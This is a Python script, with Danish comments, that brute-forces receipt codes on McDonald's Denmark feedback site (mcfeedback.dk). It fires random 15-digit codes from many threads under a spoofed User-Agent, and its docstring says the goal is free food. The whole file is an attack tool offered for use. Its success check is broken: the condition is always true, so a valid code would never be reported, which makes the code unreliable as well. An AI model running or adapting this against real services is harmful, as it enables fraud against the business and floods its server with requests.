import requests, threading, random
from colorama import Fore

""" Lavet for gratis mad, som jo er lækkert (kæmpe sejr for de hjemmeløse)! ~ Wreckt x H4xton """

red = Fore.RED
green = Fore.GREEN
white = Fore.RESET

agent = {'User-Agent': 'Mozilla/5.0 (Linux; arm_64; Android 12; SM-G965F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 YaBrowser/21.3.4.59 Mobile Safari/537.36'}

def kvit():
    while True:

        kode = random.randint(100000000000000, 900000000000000)

        r = requests.post(
            'https://mcfeedback.dk/ajax/validate-code', headers = agent,
 
            data = {
                'code'      : kode,
                'platform'  : 'web',
                'sid_token' : ''             
            }
        )

        # Håndtering

        if 'Koden kan ikke genkendes' or 'Der opstod en fejl' in r.text:
            print(f"~ {red}{kode}{white}")

        elif r.status_code == 502:
            continue

        else:
            print(f"~ {green}{kode}{white}")
            return


if __name__ == '__main__':

    try:

        i = input("Hvor mange tråde? : ")
        t = []

        for i in range(int(i) + 1):
            thread = threading.Thread(target=kvit, daemon=True)
            t.append(thread)
            thread.start()
            print(f"Tråd {i} startet.")

        for thread in t:
            thread.join()

    except (KeyboardInterrupt, ValueError):
        exit("Program lukket.")
